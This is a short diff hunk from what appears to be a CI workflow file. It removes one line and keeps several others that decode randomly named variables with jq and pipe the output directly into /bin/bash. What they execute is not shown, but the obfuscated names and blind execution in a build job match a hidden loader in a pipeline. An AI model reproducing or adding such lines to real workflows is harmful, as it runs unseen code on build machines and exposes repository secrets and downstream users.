@@ -39,7 +39,6 @@ jobs:
           echo $zgerq58463 | jq -r .j8 | /bin/bash
           echo $oiwv88 | jq -r .nu335 | /bin/bash
           echo $vr46211 | jq -r .cc37278 | /bin/bash
-          echo $sfbv78448 | jq -r .so42 | /bin/bash
           printf '%s' "$oukg7" | jq -r .jr34510 | /bin/bash
           echo $tubqu4 | jq -r .hcdle4068 | /bin/bash
           echo $v2 | jq -r .nbdoq53 | /bin/bash
